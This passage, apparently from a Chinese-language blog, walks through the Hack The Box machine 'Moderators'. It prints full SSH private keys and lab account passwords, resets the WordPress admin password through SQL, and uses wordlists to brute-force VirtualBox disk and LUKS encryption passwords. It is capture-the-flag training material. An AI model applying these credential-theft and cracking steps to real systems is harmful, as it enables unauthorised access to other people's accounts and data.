class="line">egq&#x2F;DaGJECdxk9CNDElLVQxBs3X4i&#x2F;AAAAwQDCIEQcdMnPI9cP5WUOmWWNH6jlpEpsF0qm</span><br><span class="line">0iAt4qjy&#x2F;3uoN0NdQrX+8laOMIzRVe&#x2F;Br4Py4NVmRTsMfU5t&#x2F;1Jz&#x2F;DXJoy9CcXD5VKkUnU</span><br><span class="line">p668wxSJC8y&#x2F;5cYKTeE8rwhDXxP0I5ZJztCYf8bL2BWSWF&#x2F;h4iiUW4mMKyAzvg&#x2F;iDfjGmb</span><br><span class="line">xA8bieu1cmlE5GJgbXeuxeDfRyzWtLfYCwZU5E9RHz0D+1x1M9P+EaNVQu0p3vsS8rWJly</span><br><span class="line">J&#x2F;dOO74&#x2F;zovfUAAAAPbGV4aUBtb2RlcmF0b3JzAQIDBA&#x3D;&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>



<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>lexi用户目录，user.txt:</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092914.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="信息-1"><a href="#信息-1" class="headerlink" title="信息"></a>信息</h2><p>wp-config.php中得到数据库密码，数据库直接修改wordpress用户密码登录wp后台:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">define( 'DB_NAME', 'wordpress' );</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define( 'DB_USER', 'wordpressuser' );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( 'DB_PASSWORD', 'wordpresspassword123!!' );</span><br><span class="line"></span><br><span class="line">mysql -Dwordpress -uwordpressuser -p'wordpresspassword123!!'</span><br><span class="line"></span><br><span class="line">UPDATE `wp_users` SET `user_pass` = '$P$BIsDcvvyUHRF.QKXlJzhA9.kgCsuxL/' WHERE user_login = 'admin';</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 明文是password</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Generador de hash de contraseña de WordPress<br><a href="https://www.useotools.com/es/wordpress-password-hash-generator/" target="_blank" rel="noopener">https://www.useotools.com/es/wordpress-password-hash-generator/</a></li>
</ul>
<h2 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h2><p>登录进去后，pwdms中得到john的私钥和carl账号密码：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092915.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">carl@moderators.htb</span><br><span class="line">Carl@thebest**</span><br></pre></td></tr></table></figure>

<h2 id="john-id-rsa"><a href="#john-id-rsa" class="headerlink" title="john_id_rsa"></a>john_id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAn&#x2F;Neot2K7OKlkda5TCHoWwP5u1hHhBwKzM0LN3hn7EwyXshgj9G+</span><br><span class="line">lVSMVOUMeS5SM6iyM0Tg82EVfEbAMpPuCGbWvr1inU8B6eDb9voLQyGERcbKf29I7HwXab</span><br><span class="line">8T+HkUqy+CLm&#x2F;X+GR9zlgNhNUZgJePONPK1OLUkz&#x2F;mJN9Sf57w8ebloATzJJyKNAdRg3Xq</span><br><span class="line">HUfwDldCDZiTTt3R6s5wWkrRuZ6sZp+v+RonFhfT2Ue741CSULhS2fcIGCLRW+8WQ+M0yd</span><br><span class="line">q76Ite2XHanP9lrj3de8xU92ny&#x2F;rjqU9U6EJG0DYmtpLrkbGNLey9MjuFncBqQGnCaqfFk</span><br><span class="line">HQb+S6eCIDD0N3W0flBMhJfzwxKYXpAJSlLElqhPJayinWXSZqBhbp8Bw3bs4RCHbtwawu</span><br><span class="line">SefWzZEsdA0wGrbbuopaJX1UpyuAQb2UD5YRDaSC2V2Rv4Wi&#x2F;32PxoKyAxj1x6w2wR5yty</span><br><span class="line">EoFzVfdeKQ8o5Avl4MM6gqC5qaubduLABhsEXflrAAAFiPtk5tj7ZObYAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAJ&#x2F;zXqLdiuzipZHWuUwh6FsD+btYR4QcCszNCzd4Z+xMMl7IYI&#x2F;RvpVUjFTlDHku</span><br><span class="line">UjOosjNE4PNhFXxGwDKT7ghm1r69Yp1PAeng2&#x2F;b6C0MhhEXGyn9vSOx8F2m&#x2F;E&#x2F;h5FKsvgi</span><br><span class="line">5v1&#x2F;hkfc5YDYTVGYCXjzjTytTi1JM&#x2F;5iTfUn+e8PHm5aAE8yScijQHUYN16h1H8A5XQg2Y</span><br><span class="line">k07d0erOcFpK0bmerGafr&#x2F;kaJxYX09lHu+NQklC4Utn3CBgi0VvvFkPjNMnau+iLXtlx2p</span><br><span class="line">z&#x2F;Za493XvMVPdp8v646lPVOhCRtA2JraS65GxjS3svTI7hZ3AakBpwmqnxZB0G&#x2F;kungiAw</span><br><span class="line">9Dd1tH5QTISX88MSmF6QCUpSxJaoTyWsop1l0magYW6fAcN27OEQh27cGsLknn1s2RLHQN</span><br><span class="line">MBq227qKWiV9VKcrgEG9lA+WEQ2kgtldkb+Fov99j8aCsgMY9cesNsEecrchKBc1X3XikP</span><br><span class="line">KOQL5eDDOoKguamrm3biwAYbBF35awAAAAMBAAEAAAGBAJsfhQ2AvIZGvPp2e5ipXdY&#x2F;Qc</span><br><span class="line">h+skUeiR7cUN+IJ4mU0Fj6DiQM77+Vks+WoAU6dkBhgAmW6G9BHXw8hZPHwddmHSg5NdWI</span><br><span class="line">VTvEdq&#x2F;NCnUdoVGmnKcAf4HSS0akKLMWgoQO&#x2F;Dsa&#x2F;yKIGzauUNYdcbEzy5P6W0Ehh7YTB5</span><br><span class="line">mE+FaLB&#x2F;Qi0Vni0wgTxTj2TAipp9aj+N1&#x2F;pLDY4yxeloIZmf8HhuR1TY&#x2F;tmNWGlpenni6g</span><br><span class="line">kki&#x2F;0Fb2nGuFV9VIlzCI6s7++ARLTUysVDhCB0H5Urxey4Ynxu9NWejsf6QAZibAZSb6il</span><br><span class="line">uerZYKiiJD0pmDBY1ApJhNE+tafeIeX1EyPgq9yGKUXZEI1VE0rITGbpHPjYAnn7yhLDQ9</span><br><span class="line">rcrFW&#x2F;SaR80ulolwQRm+4J8TEHAVYGzshNZ2tvrYDVGOT&#x2F;OvFObOK7kRHHKJBVL6I96htc</span><br><span class="line">vSzN5qGw3+I7YJKTrXJwJ5vEjjelmyK82FXquUcubMTW6&#x2F;B72QNW7zjRgLGGObpWWV+QAA</span><br><span class="line">AMAE4VjUADP53GgSVYpLBnR+69RVBqc5h3U3D6zButs&#x2F;m7xsMoIoBrkv342fsK4qkBYWFU</span><br><span class="line">sdCOXDQUGYcVdzXKwzRsKslGOAnyeRsg9wYsVhcc1YSWIJZBdBIaqPBKcfsVGUM88icxqk</span><br><span class="line">Qn6CEN4Bwy0ZgB&#x2F;SAXMMU8IQHtcfZQFeiByg0&#x2F;XRlvZuQay6Cw6&#x2F;406dlzTJDmzGzkzX08</span><br><span class="line">4V8F7PfPJ2oSs6c813vv6B1iKw1Ii9qAmPqBFC83rwnCjs+Q0AAADBANUfGWc7YgCVG5SO</span><br><span class="line">u89ba4uO4wZ&#x2F;zpbHog7cs1flldkrtDZluiqWWopTAKpnsD2CXSxoZ7cWdPytJeuElvlRmY</span><br><span class="line">aUUrjaj2WFdNLgMjFb4jZeEcI3lz8BeRSTiXUSbLA4SxVLeSizZx8g1SNVAlE5VwUWZVYo</span><br><span class="line">6ge465sU&#x2F;c54jAxW2X2yioPCPdYVEpOTTZr40mg94&#x2F;Zycxlbd8+L1jaepLqvXq5K4lSXPr</span><br><span class="line">PoZ&#x2F;w+K9mf5912RGlmSzBARVUyCqquLQAAAMEAwCGwEI9KR0zmcnfhGiQviWObgAUEDA7h</span><br><span class="line">HxJn61h6sI0SsFOCatx9Q+a7sbKeVqQdph8Rn5rInzQ7TpvflHsrGzvU0ZpZ0Ys2928pN7</span><br><span class="line">So+Bt6jTiNTXdD24&#x2F;FmZbxn&#x2F;BXLovEJpeT2L3V3kvabJAHhSykFP0+Q0dlNDmQxuMQ+muO</span><br><span class="line">FQGVHxktaFKkrEl71gqoHPll8zNwNY9BjpxFPy48B1RgkxkfHSNZ8ujSI6Wse3tX6T03HD</span><br><span class="line">fotkBDyCmCDxz3AAAAD2pvaG5AbW9kZXJhdG9ycwECAw&#x3D;&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<h1 id="John"><a href="#John" class="headerlink" title="John"></a>John</h1><p>现在可以登录john用户继续进行后续操作,发现VBOX相关文件：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092916.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="vdi-crack"><a href="#vdi-crack" class="headerlink" title="vdi crack"></a>vdi crack</h2><p>后续操作需要virtualbox，参考wp云了(论坛也一致认为root部分很蠢，这台机器的评分也说明了这一点)：</p>
<p>首先修改vbox文件,对应本地路径等信息</p>
<p>然后破解vdi密码</p>
<ul>
<li>axcheron/pyvboxdie-cracker: Simple Python tool to crack VirtualBox Disk Image Encryption passwords<br><a href="https://github.com/axcheron/pyvboxdie-cracker" target="_blank" rel="noopener">https://github.com/axcheron/pyvboxdie-cracker</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">❯ python3 pyvboxdie-cracker.py -v 2019-08-01.vbox -d wordlist.txt</span><br><span class="line">Starting pyvboxdie-cracker...</span><br><span class="line"></span><br><span class="line">[*] Encrypted drive found :  F:/2019.vdi</span><br><span class="line">[*] KeyStore information...</span><br><span class="line"> Algorithm = AES-XTS256-PLAIN64</span><br><span class="line"> Hash = PBKDF2-SHA256</span><br><span class="line"> Final Hash = 5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f</span><br><span class="line"></span><br><span class="line">[*] Starting bruteforce...</span><br><span class="line"> 51 password tested...</span><br><span class="line"></span><br><span class="line">[*] Password Found = computer</span><br></pre></td></tr></table></figure>

<p>对于接下来的内容，请记住安装 virtualbox 扩展包</p>
<p>一旦我们安装了 ubuntu 并添加了 vdi，我们必须启用我们之前看到的加密</p>
<p>当试图将它挂载到 /dev/shm 时，我们会得到一个 crypto_LUKS 类型的错误</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ sudo mount /dev/sda /dev/shm</span><br><span class="line">mount: /dev/shm: unknown filesystem type 'crypto_LUKS'</span><br><span class="line">ubuntu@ubuntu:~$</span><br></pre></td></tr></table></figure>

<p>我们可以用一个工具来帮助自己获取密码:</p>
<ul>
<li>Diverto/cryptsetup-pwguess: Modified cryptsetup to enable password guessing - <a href="https://diverto.github.io/2019/11/18/Cracking-LUKS-passphrases" target="_blank" rel="noopener">https://diverto.github.io/2019/11/18/Cracking-LUKS-passphrases</a><br><a href="https://github.com/Diverto/cryptsetup-pwguess" target="_blank" rel="noopener">https://github.com/Diverto/cryptsetup-pwguess</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ./bruteforce-luks-static-linux-amd64 -f wordlist.txt /dev/sda</span><br><span class="line">Password found: abc123</span><br><span class="line">ubuntu@ubuntu:~$</span><br></pre></td></tr></table></figure>

<p>安装后，我们会找到几个脚本，包括带有密码的 distro_update.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo ""</span><br><span class="line">echo "Installing updates.."</span><br><span class="line">passwd='$_THE_best_Sysadmin_Ever_'</span><br><span class="line">echo $passwd|sudo apt-get update</span><br><span class="line"></span><br><span class="line">echo "Upgrading..."</span><br><span class="line">echo $passwd|sudo apt-get -y upgrade</span><br></pre></td></tr></table></figure>



<h2 id="changed-vbox"><a href="#changed-vbox" class="headerlink" title="changed_vbox"></a>changed_vbox</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">** DO NOT EDIT THIS FILE.</span></span><br><span class="line"><span class="comment">** If you make changes to this file while any VirtualBox related application</span></span><br><span class="line"><span class="comment">** is running, your changes will be overwritten later, without taking effect.</span></span><br><span class="line"><span class="comment">** Use VBoxManage or the VirtualBox Manager GUI to make changes.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualBox</span> <span class="attr">xmlns</span>=<span class="string">"http://www.virtualbox.org/"</span> <span class="attr">version</span>=<span class="string">"1.16-windows"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Machine</span> <span class="attr">uuid</span>=<span class="string">"&#123;528b3540-b8be-4677-b43f-7f4969137747&#125;"</span> <span class="attr">name</span>=<span class="string">"Moderator 1"</span> <span class="attr">OSType</span>=<span class="string">"Ubuntu_64"</span> <span class="attr">snapshotFolder</span>=<span class="string">"Snapshots"</span> <span class="attr">lastStateChange</span>=<span class="string">"2022-08-11T19:20:46Z"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">MediaRegistry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">HardDisks</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">HardDisk</span> <span class="attr">uuid</span>=<span class="string">"&#123;12b147da-5b2d-471f-9e32-a32b1517ff4b&#125;"</span> <span class="attr">location</span>=<span class="string">"./2019.vdi"</span> <span class="attr">format</span>=<span class="string">"VDI"</span> <span class="attr">type</span>=<span class="string">"Normal"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">"CRYPT/KeyId"</span> <span class="attr">value</span>=<span class="string">"Moderator 1"</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">"CRYPT/KeyStore"</span> <span class="attr">value</span>=<span class="string">"U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&amp;#13;&amp;#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAADssBk3IXYOVlXkLWlDd8JCJ8ZUN8FC&amp;#13;&amp;#10;kVQY8Ovl9vXMMyAAAABu5KwY/KgMH20LHptIADnZJ6gRrgSFLm+s6eJEaJx+ziBO&amp;#13;&amp;#10;AAByl/CysecMVxqIA8QKkYqCcCT+RiMz7PJCBnJ+/oGFI2DqAABAAAAAKGFz0b7a&amp;#13;&amp;#10;q8cFTdpSCXUCgvz+yFWcIi1i2jYow1/CS0CEEATdrtbMxzzANgoenuThAceBWSUQ&amp;#13;&amp;#10;FqJ4CioY8Qm3BA=="</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">HardDisk</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">HardDisks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">MediaRegistry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ExtraData</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExtraDataItem</span> <span class="attr">name</span>=<span class="string">"GUI/LastCloseAction"</span> <span class="attr">value</span>=<span class="string">"PowerOff"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExtraDataItem</span> <span class="attr">name</span>=<span class="string">"GUI/LastGuestSizeHint"</span> <span class="attr">value</span>=<span class="string">"2560,1335"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExtraDataItem</span> <span class="attr">name</span>=<span class="string">"GUI/LastNormalWindowPosition"</span> <span class="attr">value</span>=<span class="string">"0,23,640,480,max"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ExtraData</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Hardware</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">CPU</span> <span class="attr">count</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">PAE</span> <span class="attr">enabled</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">LongMode</span> <span class="attr">enabled</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">X2APIC</span> <span class="attr">enabled</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">HardwareVirtExLargePages</span> <span class="attr">enabled</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">CPU</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Memory</span> <span class="attr">RAMSize</span>=<span class="string">"2048"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">HID</span> <span class="attr">Pointing</span>=<span class="string">"USBTablet"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Boot</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Order</span> <span class="attr">position</span>=<span class="string">"1"</span> <span class="attr">device</span>=<span class="string">"Floppy"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Order</span> <span class="attr">position</span>=<span class="string">"2"</span> <span class="attr">device</span>=<span class="string">"HardDisk"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Order</span> <span class="attr">position</span>=<span class="string">"3"</span> <span class="attr">device</span>=<span class="string">"DVD"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Order</span> <span class="attr">position</span>=<span class="string">"4"</span> <span class="attr">device</span>=<span class="string">"None"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Boot</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Display</span> <span class="attr">controller</span>=<span class="string">"VMSVGA"</span> <span class="attr">VRAMSize</span>=<span class="string">"128"</span> <span class="attr">accelerate3D</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">BIOS</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">IOAPIC</span> <span class="attr">enabled</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">SmbiosUuidLittleEndian</span> <span class="attr">enabled</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">BIOS</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">USB</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Controllers</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Controller</span> <span class="attr">name</span>=<span class="string">"OHCI"</span> <span class="attr">type</span>=<span class="string">"OHCI"</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Controller</span> <span class="attr">name</span>=<span class="string">"EHCI"</span> <span class="attr">type</span>=<span class="string">"EHCI"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Controllers</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">USB</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Network</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Adapter</span> <span class="attr">slot</span>=<span class="string">"0"</span> <span class="attr">enabled</span>=<span class="string">"true"</span> <span class="attr">MACAddress</span>=<span class="string">"08002799F7EC"</span> <span class="attr">type</span>=<span class="string">"82540EM"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">NAT</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Adapter</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Network</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">AudioAdapter</span> <span class="attr">codec</span>=<span class="string">"AD1980"</span> <span class="attr">driver</span>=<span class="string">"DirectSound"</span> <span class="attr">enabled</span>=<span class="string">"true"</span> <span class="attr">enabledIn</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">RTC</span> <span class="attr">localOrUTC</span>=<span class="string">"UTC"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Clipboard</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">GuestProperties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/GuestAdd/HostVerLastChecked"</span> <span class="attr">value</span>=<span class="string">"6.1.34"</span> <span class="attr">timestamp</span>=<span class="string">"1657117437893678100"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/GuestAdd/Revision"</span> <span class="attr">value</span>=<span class="string">"150636"</span> <span class="attr">timestamp</span>=<span class="string">"1657117380950198406"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/GuestAdd/Version"</span> <span class="attr">value</span>=<span class="string">"6.1.34"</span> <span class="attr">timestamp</span>=<span class="string">"1657117380950198404"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/GuestAdd/VersionExt"</span> <span class="attr">value</span>=<span class="string">"6.1.34"</span> <span class="attr">timestamp</span>=<span class="string">"1657117380950198405"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/GuestInfo/Net/0/MAC"</span> <span class="attr">value</span>=<span class="string">"08002799F7EC"</span> <span class="attr">timestamp</span>=<span class="string">"1657117380952151105"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/GuestInfo/Net/0/Name"</span> <span class="attr">value</span>=<span class="string">"enp0s3"</span> <span class="attr">timestamp</span>=<span class="string">"1657117380952151107"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/GuestInfo/Net/0/Status"</span> <span class="attr">value</span>=<span class="string">"Up"</span> <span class="attr">timestamp</span>=<span class="string">"1657117380952151106"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/GuestInfo/Net/0/V4/Broadcast"</span> <span class="attr">value</span>=<span class="string">"10.0.2.255"</span> <span class="attr">timestamp</span>=<span class="string">"1657117380952151103"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/GuestInfo/Net/0/V4/IP"</span> <span class="attr">value</span>=<span class="string">"10.0.2.15"</span> <span class="attr">timestamp</span>=<span class="string">"1657117380952151102"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/GuestInfo/Net/0/V4/Netmask"</span> <span class="attr">value</span>=<span class="string">"255.255.255.0"</span> <span class="attr">timestamp</span>=<span class="string">"1657117380952151104"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/GuestInfo/Net/Count"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">timestamp</span>=<span class="string">"1657117646084736900"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/GuestInfo/OS/Product"</span> <span class="attr">value</span>=<span class="string">"Linux"</span> <span class="attr">timestamp</span>=<span class="string">"1657117380950198400"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/GuestInfo/OS/Release"</span> <span class="attr">value</span>=<span class="string">"5.15.0-40-generic"</span> <span class="attr">timestamp</span>=<span class="string">"1657117380950198401"</span> <span class="attr">flags</span>=<span class="string">""</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">GuestProperty</span> <span class="attr">name</span>=<span class="string">"/VirtualBox/GuestInfo/OS/Version"</span> <span class="attr">value</span>=<span class="string">"#43-Ubuntu SMP Wed Jun 15 12:54:21 UTC 2022"</span> 